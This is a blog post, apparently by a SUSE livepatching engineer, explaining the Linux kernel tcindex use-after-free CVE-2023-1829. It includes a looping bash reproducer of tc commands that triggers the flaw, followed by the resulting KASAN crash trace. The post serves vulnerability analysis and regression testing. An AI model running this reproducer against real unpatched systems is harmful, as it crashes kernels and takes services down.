---
title: "Five commands to crash the kernel"
summary: "A tcindex tale"
date: 2023-08-22T21:18:21-03:00
slug: five-commands-to-crash-the-kernel
cover:
    image: "/images/boom.png"
---

## Introduction

Working on the [SUSE](https://suse.com/) [Kernel
Livepatching](https://www.suse.com/products/live-patching/) Team means dealing
with lots of CVEs, and the majority of them are related to kernel network
subsystem.

[CVE-2023-1829](https://nvd.nist.gov/vuln/detail/CVE-2023-1829) was discovered
recently and is one CVE that I found interesting. The problem is a
Use-After-Free flaw in one of the oldest traffic control classifiers in the
Linux kernel.
[StarLabs](https://starlabs.sg/blog/2023/06-breaking-the-code-exploiting-and-examining-cve-2023-1829-in-cls_tcindex-classifier-vulnerability/#vulnerability-analysis)
did great coverage of this CVE, explaining core concepts such as netlink, tc,
qdisc, classifiers and examining and exploiting this CVE.

In this article, I'm going to cover how to trigger the problem using only the
[tc](https://man7.org/linux/man-pages/man8/tc.8.html) tool.

Most CVEs contain details and even exploits for the security problems described,
but they are not so easy to digest and often it can be hard to understand the
nature of the problem. While these reports are comprehensive, sometimes it can
be hard to understand how to trigger the problem and exploit a CVE.
Understanding the problem and the mechanisms to trigger it is a crucial part of
our livepatch creation process at SUSE.

First let's try to understand the problem introduced by CVE-2023-1829 by
reading its [description](https://nvd.nist.gov/vuln/detail/CVE-2023-1829):

```
A use-after-free vulnerability in the Linux Kernel traffic control index filter
(tcindex) can be exploited to achieve local privilege escalation. The
tcindex_delete function which does not properly deactivate filters in case of a
perfect hashes while deleting the underlying structure which can later lead to
double freeing the structure. A local attacker user can use this vulnerability
to elevate its privileges to root. We recommend upgrading past commit
8c710f75256bb3cf05ac7b1672c82b92c43f3d28.
```

Now let's check what [commit
8c710f75256bb3cf05ac7b1672c82b92c43f3d28](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=8c710f75256bb3cf05ac7b1672c82b92c43f3d28)
does:

```
net/sched: Retire tcindex classifier

The tcindex classifier has served us well for about a quarter of a century
but has not been getting much TLC due to lack of known users. Most recently
it has become easy prey to syzkaller. For this reason, we are retiring it.
```

As you can see, the affected code was removed from the kernel. Problem solved. That is one easy way to fix a CVE.

## Perfect hashes

The CVE description mentions perfect hashes, but what exactly is it? Let's look into the code a bit:

```c
static inline int
valid_perfect_hash(struct tcindex_data *p)
{
	return p->hash > (p->mask >> p->shift);
}
```

As you can see, the tcindex code has a function that checks if the created
filter can use perfect hashes. This function is called from
**tcindex_set_parms**, where it validates the *hash*, *mask*, and *shift*
values. If not informed, *p->hash* default value is 64 (**DEFAULT_HASH_SIZE**).
The value of *shift* and *mask* are obtained when adding the tcindex filter, and
the *shift* [upper limit is
16](https://elixir.bootlin.com/linux/v6.0.19/source/net/sched/cls_tcindex.c#L374).
With this information we can force the use of perfect hashes by creating a
filter using 10 as *shift* value, and 65635 (0xFFFF) for *mask*:

```c
p->hash(64) > p->mask(0xFFFF) >> p->shift(10); // (the shift operation results in 63)
```

Using the rationale above, we can create a reproducer script to trigger the crash in a vulnerable system:

```sh
#!/bin/bash

set -ex

for i in {1..300}; do
	tc qdisc add dev lo root handle 1:0 htb default 30
	tc class add dev lo parent 1: classid 1:1 htb rate 256kbit

	# Create a tcindex filter setting shift and mask to certain values to
	# make tcindex use the perfect hash
	tc filter add dev lo parent 1: protocol ip prio 1  \
		handle 10 tcindex mask 0xFFFF shift 10 classid 1:1 action drop

	# delete the filter to trigger the UAF on tcindex_delete
	tc filter delete dev lo parent 1: prio 1 handle 10 protocol ip tcindex
	tc qdisc delete dev lo root handle 1:0 htb
done
```
The tcindex filter created and deleted above is using perfect hashes. The loop
is there to trigger the UAF as soon as possible to bring the system down.

Now let's see what happens if we run the script above in a vulnerable kernel
with KASAN enabled:

```
bash rep.sh
+ for i in {1..300}
+ tc qdisc add dev lo root handle 1:0 htb default 30
+ tc class add dev lo parent 1: classid 1:1 htb rate 256kbit
+ tc filter add dev lo parent 1: protocol ip prio 1 handle 10 tcindex mask 0xFFFF shift 10 classid 1:1 action drop
[    7.066915] GACT probability NOT on
[    7.073193] tc (113) used greatest stack depth: 24352 bytes left
+ tc filter delete dev lo parent 1: prio 1 handle 10 protocol ip tcindex
+ tc qdisc delete dev lo root handle 1:0 htb                                                                                                            + for i in {1..300}                                                         
+ tc qdisc add dev lo root handle 1:0 htb default 30
[    7.141508] ==================================================================
[    7.142150] BUG: KASAN: use-after-free in tcf_action_destroy+0x66/0xd0
[    7.142414] Read of size 8 at addr ffff8881140aba00 by task kworker/u8:0/9
[    7.142671]
[    7.142732] CPU: 0 PID: 9 Comm: kworker/u8:0 Not tainted 6.2.0 #2
[    7.142956] Hardware name: Bochs Bochs, BIOS Bochs 01/01/2011
[    7.143213] Workqueue: tc_filter_workqueue tcindex_destroy_rexts_work [cls_tcindex]
[    7.143926] Call Trace:
[    7.144059]  <TASK>
[    7.144162]  dump_stack_lvl+0x48/0x5f
[    7.144335]  print_report+0x184/0x4b1
[    7.144510]  ? __virt_addr_valid+0xdd/0x160
[    7.144683]  kasan_report+0xdd/0x120
[    7.144850]  ? tcf_action_destroy+0x66/0xd0
[    7.145065]  ? tcf_action_destroy+0x66/0xd0
[    7.145301]  tcf_action_destroy+0x66/0xd0
[    7.145515]  tcf_exts_destroy+0x2d/0x60
[    7.145710]  __tcindex_destroy_rexts+0x11/0xf0 [cls_tcindex]
[    7.145991]  tcindex_destroy_rexts_work+0x1b/0x30 [cls_tcindex]
[    7.146297]  process_one_work+0x57a/0xa40
[    7.146512]  ? __pfx_process_one_work+0x10/0x10
[    7.146737]  ? __pfx_do_raw_spin_lock+0x10/0x10
[    7.146971]  worker_thread+0x93/0x700
[    7.147158]  ? __pfx_worker_thread+0x10/0x10
[    7.147369]  kthread+0x159/0x190
[    7.147534]  ? __pfx_kthread+0x10/0x10
[    7.147725]  ret_from_fork+0x29/0x50
[    7.147909]  </TASK>
[    7.148027]
[    7.148111] Allocated by task 113:
[    7.148288]  kasan_save_stack+0x33/0x60
[    7.148486]  kasan_set_track+0x25/0x30
[    7.148683]  __kasan_kmalloc+0x92/0xa0
[    7.148881]  tcindex_set_parms+0x150/0x11c0 [cls_tcindex]
[    7.149174]  tcindex_change+0x15b/0x21f [cls_tcindex]
[    7.149442]  tc_new_tfilter+0x6f4/0x11b0
[    7.149654]  rtnetlink_rcv_msg+0x535/0x6b0
[    7.149862]  netlink_rcv_skb+0xdc/0x210
[    7.150060]  netlink_unicast+0x2d0/0x460
[    7.150262]  netlink_sendmsg+0x39b/0x690
[    7.150482]  ____sys_sendmsg+0x404/0x430
[    7.150716]  ___sys_sendmsg+0xfd/0x170
[    7.151025]  __sys_sendmsg+0xee/0x180
[    7.151259]  do_syscall_64+0x3c/0x90
[    7.151453]  entry_SYSCALL_64_after_hwframe+0x72/0xdc
```

As expected, things went bad. As you can see, **five commands can crash your
kernel**, if tcindex is enabled. The reproducer above was a good candidate to be
included in the [Linux Testing Project
(LTP)](https://linux-test-project.github.io/), so I asked my SUSE colleague
Martin Doucha to do it, and he did: [Add test for CVE
2023-1829](https://github.com/linux-test-project/ltp/commit/4bbd85ac3bbc77384352f4b66e59b1bb05fbc29e).
The submitted code uses the LTP API to create the filter, instead of relying on
the tc tool. Thanks a lot Martin!

## Conclusion

Learning about APIs and kernel features that you never heard of is a fascinating
part of creating kernel livepatches. This was the case for me when I looked into
(now defunct) tcindex code and it's even better when your reproducer is merged
into LTP.

That's all for today, thanks a lot for reading. See you in the next post!

## References

* [Breaking the Code - Exploiting and Examining CVE-2023-1829 in cls_tcindex Classifier Vulnerability](https://starlabs.sg/blog/2023/06-breaking-the-code-exploiting-and-examining-cve-2023-1829-in-cls_tcindex-classifier-vulnerability/#vulnerability-analysis)
* [CVE-2023-1829](https://nvd.nist.gov/vuln/detail/CVE-2023-1829)
* [Linux Advanced Routing and Traffic Control (LARC)](https://tldp.org/HOWTO/Adv-Routing-HOWTO/)
* [Mecanismos de QoS em Linux (in Portuguese)](https://wiki.sj.ifsc.edu.br/images/0/0d/QoSLinux.pdf)
